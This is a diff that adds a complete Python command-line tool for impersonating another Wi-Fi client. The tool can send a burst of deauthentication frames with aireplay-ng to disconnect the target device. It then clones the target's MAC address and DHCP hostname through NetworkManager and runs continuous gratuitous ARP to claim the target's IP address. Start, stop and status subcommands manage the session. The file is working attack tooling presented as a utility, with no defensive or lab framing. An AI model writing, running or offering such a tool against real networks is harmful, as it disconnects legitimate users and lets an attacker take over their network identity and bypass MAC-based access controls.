@@ -1,0 +1,419 @@
+#!/usr/bin/env python3
+"""wlan-impersonator — Spoof a WLAN client's identity via NetworkManager."""
+
+from __future__ import annotations
+
+import argparse
+import ipaddress
+import json
+import os
+import re
+import shutil
+import signal
+import subprocess
+import sys
+import tempfile
+import time
+from pathlib import Path
+
+SCRIPT_DIR = Path(__file__).resolve().parent
+STATE_FILE = SCRIPT_DIR / ".state"
+
+SAFE_NAME_RE = re.compile(r"^[\w.+=@:/-]+$")
+MAC_RE = re.compile(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
+
+_arping_pid: int = 0
+_active_connection: str = ""
+
+# ── Output helpers ───────────────────────────────────────────────────────────
+
+def die(msg: str) -> None:
+    print(f"[ERROR] {msg}", file=sys.stderr)
+    sys.exit(1)
+
+def warn(msg: str) -> None:
+    print(f"[WARN]  {msg}", file=sys.stderr)
+
+def info(msg: str) -> None:
+    print(f"[*] {msg}")
+
+def ok(msg: str) -> None:
+    print(f"[+] {msg}")
+
+# ── Validation ───────────────────────────────────────────────────────────────
+
+def validate_mac(mac: str) -> None:
+    if not MAC_RE.match(mac):
+        die(f"Invalid MAC address format: {mac}")
+
+def validate_ip(ip: str) -> None:
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        die(f"Invalid IP address: {ip}")
+
+def validate_safe_name(value: str, label: str) -> None:
+    if not value or not SAFE_NAME_RE.match(value):
+        die(f"Invalid characters in {label}: {value!r}")
+
+def require_bin(name: str) -> None:
+    if not shutil.which(name):
+        die(f"Required dependency not found: {name}")
+
+def require_root() -> None:
+    if os.geteuid() != 0:
+        die("This command must be run as root (use sudo)")
+
+def require_connection(conn: str) -> None:
+    r = subprocess.run(
+        ["nmcli", "connection", "show", conn],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+    )
+    if r.returncode != 0:
+        die(f"NetworkManager connection '{conn}' not found")
+
+# ── Signal handling ─────────────────────────────────────────────────────────
+
+def _cleanup_handler(signum: int, _frame: object) -> None:
+    global _arping_pid
+    signame = signal.Signals(signum).name
+    warn(f"Caught {signame} — cleaning up...")
+    if _arping_pid:
+        stop_arping(_arping_pid)
+        _arping_pid = 0
+    if _active_connection:
+        try:
+            revert_spoof(_active_connection)
+            reconnect(_active_connection)
+        except Exception as exc:
+            warn(f"Could not fully revert during cleanup: {exc}")
+    clear_state()
+    sys.exit(128 + signum)
+
+# ── State management ────────────────────────────────────────────────────────
+
+def save_state(data: dict) -> None:
+    fd, tmp = tempfile.mkstemp(dir=SCRIPT_DIR, prefix=".state.", suffix=".tmp")
+    fd_closed = False
+    try:
+        os.write(fd, json.dumps(data).encode())
+        os.fchmod(fd, 0o600)
+        os.close(fd)
+        fd_closed = True
+        os.rename(tmp, STATE_FILE)
+    except BaseException:
+        if not fd_closed:
+            os.close(fd)
+        os.unlink(tmp)
+        raise
+    ok(f"State saved to {STATE_FILE}")
+
+def load_state() -> dict | None:
+    if not STATE_FILE.exists():
+        return None
+    try:
+        return json.loads(STATE_FILE.read_text())
+    except (json.JSONDecodeError, OSError) as exc:
+        warn(f"Could not read state file: {exc}")
+        return None
+
+def clear_state() -> None:
+    STATE_FILE.unlink(missing_ok=True)
+
+# ── Process helpers ──────────────────────────────────────────────────────────
+
+def _pid_alive(pid: int) -> bool:
+    try:
+        os.kill(pid, 0)
+        return True
+    except ProcessLookupError:
+        return False
+    except PermissionError:
+        return True
+
+# ── Network operations ──────────────────────────────────────────────────────
+
+def run_deauth(iface: str, bssid: str, target_mac: str, count: int, delay: int) -> None:
+    require_bin("aireplay-ng")
+    info(f"Sending {count} deauth frames to {target_mac} via {iface} (AP {bssid})...")
+    r = subprocess.run(
+        ["aireplay-ng", "--deauth", str(count),
+         "-a", bssid, "-c", target_mac, iface],
+    )
+    if r.returncode != 0:
+        warn(f"aireplay-ng exited with code {r.returncode} — target may not be in range")
+        warn("Continuing with spoofing anyway...")
+    else:
+        ok("Deauth burst sent")
+    info(f"Waiting {delay}s before connecting...")
+    time.sleep(delay)
+
+
+def apply_spoof(conn: str, mac: str, hostname: str) -> None:
+    info(f"Applying spoofed identity to connection '{conn}'...")
+    info(f"  MAC:      {mac}")
+    info(f"  Hostname: {hostname}")
+    subprocess.run(
+        ["nmcli", "connection", "modify", conn,
+         "wifi.cloned-mac-address", mac,
+         "ipv4.dhcp-hostname", hostname],
+        check=True,
+    )
+    ok("nmcli configuration applied")
+
+
+def reconnect(conn: str) -> None:
+    info(f"Reconnecting '{conn}'...")
+    subprocess.run(
+        ["nmcli", "connection", "down", conn],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+    )
+    time.sleep(1)
+    subprocess.run(["nmcli", "connection", "up", conn], check=True)
+    ok(f"Connection '{conn}' is up")
+
+
+def revert_spoof(conn: str) -> None:
+    info(f"Reverting spoofed identity on connection '{conn}'...")
+    subprocess.run(
+        ["nmcli", "connection", "modify", conn,
+         "wifi.cloned-mac-address", "",
+         "ipv4.dhcp-hostname", ""],
+        check=True,
+    )
+    ok("Identity reverted to original values")
+
+
+def start_arping(iface: str, mac: str, ip: str) -> int:
+    info(f"Starting continuous gratuitous ARP on {iface} ({mac} -> {ip})...")
+    proc = subprocess.Popen(
+        ["arping", "-U", "-I", iface, "-s", mac, ip],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+    )
+    ok(f"arping running in background (PID {proc.pid})")
+    return proc.pid
+
+
+def stop_arping(pid: int) -> None:
+    if not pid:
+        return
+    if not _pid_alive(pid):
+        warn(f"arping process {pid} is not running")
+        return
+
+    info(f"Stopping arping (PID {pid})...")
+    try:
+        os.kill(pid, signal.SIGTERM)
+    except ProcessLookupError:
+        ok("arping already gone")
+        return
+    except PermissionError:
+        die(f"No permission to kill arping (PID {pid}) — are you root?")
+
+    for _ in range(10):
+        if not _pid_alive(pid):
+            break
+        time.sleep(0.3)
+    ok("arping stopped")
+
+# ── Subcommands ─────────────────────────────────────────────────────────────
+
+def cmd_start(args: argparse.Namespace) -> None:
+    global _arping_pid, _active_connection
+    require_root()
+    validate_mac(args.target_mac)
+    validate_ip(args.target_ip)
+    validate_safe_name(args.connection, "--connection")
+    validate_safe_name(args.iface, "--iface")
+    validate_safe_name(args.target_hostname, "--target-hostname")
+    if not 1 <= args.deauth_count <= 1000:
+        die(f"--deauth-count must be between 1 and 1000, got {args.deauth_count}")
+    if not 0 <= args.deauth_delay <= 60:
+        die(f"--deauth-delay must be between 0 and 60, got {args.deauth_delay}")
+    require_bin("nmcli")
+    require_bin("arping")
+    require_connection(args.connection)
+
+    if STATE_FILE.exists():
+        warn(f"A previous session state exists ({STATE_FILE})")
+        warn("Run 'stop' first or remove the state file manually")
+        die("Aborting to prevent stale state conflicts")
+
+    _active_connection = args.connection
+    signal.signal(signal.SIGINT, _cleanup_handler)
+    signal.signal(signal.SIGTERM, _cleanup_handler)
+
+    w = 30
+    t = lambda s: s[:w] if len(s) > w else s
+
+    print()
+    print("┌──────────────────────────────────────────────┐")
+    print("│  WLAN Client Impersonation                   │")
+    print("├──────────────────────────────────────────────┤")
+    print(f"│  Connection : {t(args.connection):<{w}} │")
+    print(f"│  Interface  : {t(args.iface):<{w}} │")
+    print(f"│  Target MAC : {t(args.target_mac):<{w}} │")
+    print(f"│  Hostname   : {t(args.target_hostname):<{w}} │")
+    print(f"│  Target IP  : {t(args.target_ip):<{w}} │")
+    if args.router_bssid:
+        print(f"│  Router BSSID: {t(args.router_bssid):<{w-1}} │")
+        deauth_info = f"YES ({args.deauth_count} frames, {args.deauth_delay}s delay)"
+        print(f"│  Deauth     : {t(deauth_info):<{w}} │")
+    else:
+        print(f"│  Deauth     : {'NO (--router-bssid not set)':<{w}} │")
+    print("└──────────────────────────────────────────────┘")
+    print()
+
+    if args.router_bssid:
+        validate_mac(args.router_bssid)
+        run_deauth(args.iface, args.router_bssid, args.target_mac,
+                   args.deauth_count, args.deauth_delay)
+
+    apply_spoof(args.connection, args.target_mac, args.target_hostname)
+    reconnect(args.connection)
+    _arping_pid = start_arping(args.iface, args.target_mac, args.target_ip)
+
+    save_state({
+        "connection": args.connection,
+        "iface": args.iface,
+        "target_mac": args.target_mac,
+        "target_hostname": args.target_hostname,
+        "target_ip": args.target_ip,
+        "arping_pid": _arping_pid,
+    })
+
+    print()
+    ok("Impersonation active. Use 'stop' to revert.")
+
+
+def cmd_stop(args: argparse.Namespace) -> None:
+    require_root()
+    require_bin("nmcli")
+    validate_safe_name(args.connection, "--connection")
+    state = load_state()
+
+    if state:
+        stop_arping(state.get("arping_pid", 0))
+    else:
+        warn("No state file found — attempting revert anyway")
+
+    revert_spoof(args.connection)
+    reconnect(args.connection)
+    clear_state()
+    print()
+    ok("Identity reverted. Original connection restored.")
+
+
+def cmd_status(args: argparse.Namespace) -> None:
+    require_bin("nmcli")
+    validate_safe_name(args.connection, "--connection")
+    print()
+    print(f"── Connection: {args.connection} ──")
+    print()
+
+    cloned_mac = ""
+    hostname = ""
+    try:
+        r = subprocess.run(
+            ["nmcli", "-g", "wifi.cloned-mac-address", "connection", "show", args.connection],
+            capture_output=True, text=True,
+        )
+        cloned_mac = r.stdout.strip()
+    except OSError as exc:
+        warn(f"Could not query cloned MAC: {exc}")
+    try:
+        r = subprocess.run(
+            ["nmcli", "-g", "ipv4.dhcp-hostname", "connection", "show", args.connection],
+            capture_output=True, text=True,
+        )
+        hostname = r.stdout.strip()
+    except OSError as exc:
+        warn(f"Could not query DHCP hostname: {exc}")
+
+    if cloned_mac and cloned_mac != "--":
+        print(f"  Cloned MAC:      {cloned_mac}")
+    else:
+        print("  Cloned MAC:      (not set — using real MAC)")
+
+    if hostname and hostname != "--":
+        print(f"  DHCP Hostname:   {hostname}")
+    else:
+        print("  DHCP Hostname:   (not set — using system hostname)")
+
+    print()
+    print("── Runtime state ──")
+    print()
+
+    state = load_state()
+    if state:
+        print(f"  State file:      {STATE_FILE}")
+        print(f"  Target MAC:      {state.get('target_mac', '?')}")
+        print(f"  Target Hostname: {state.get('target_hostname', '?')}")
+        print(f"  Target IP:       {state.get('target_ip', '?')}")
+        print(f"  Interface:       {state.get('iface', '?')}")
+
+        pid = state.get("arping_pid", 0)
+        if pid:
+            if _pid_alive(pid):
+                print(f"  arping:          RUNNING (PID {pid})")
+            else:
+                print(f"  arping:          DEAD (PID {pid} was recorded but process is gone)")
+        else:
+            print("  arping:          not tracked")
+    else:
+        print("  No active session (state file not found)")
+
+    print()
+
+# ── CLI ──────────────────────────────────────────────────────────────────────
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(
+        prog="doppel",
+        description="Spoof a WLAN client's identity (MAC + DHCP hostname) via NetworkManager.",
+    )
+    sub = p.add_subparsers(dest="command", required=True)
+
+    sp = sub.add_parser("start", help="Spoof identity and connect to the network")
+    sp.add_argument("-c", "--connection", required=True,
+                    help="NetworkManager connection name")
+    sp.add_argument("-i", "--iface", required=True,
+                    help="Wireless interface (e.g. wlo1)")
+    sp.add_argument("-m", "--target-mac", required=True,
+                    help="MAC address to impersonate")
+    sp.add_argument("-n", "--target-hostname", required=True,
+                    help="Hostname to inject via DHCP option 12")
+    sp.add_argument("-a", "--target-ip", required=True,
+                    help="IP address for gratuitous ARP")
+    sp.add_argument("-b", "--router-bssid", default=None,
+                    help="Router BSSID — enables initial deauth burst")
+    sp.add_argument("--deauth-count", type=int, default=10, metavar="N",
+                    help="Deauth frame count, 1-1000 (default: 10)")
+    sp.add_argument("--deauth-delay", type=int, default=3, metavar="N",
+                    help="Seconds to wait after deauth, 0-60 (default: 3)")
+
+    sp = sub.add_parser("stop", help="Revert spoofed identity and reconnect")
+    sp.add_argument("-c", "--connection", required=True,
+                    help="NetworkManager connection name")
+
+    sp = sub.add_parser("status", help="Show current spoofing state")
+    sp.add_argument("-c", "--connection", required=True,
+                    help="NetworkManager connection name")
+
+    return p
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    dispatch = {
+        "start":  cmd_start,
+        "stop":   cmd_stop,
+        "status": cmd_status,
+    }
+    dispatch[args.command](args)
+
+
+if __name__ == "__main__":
+    main()
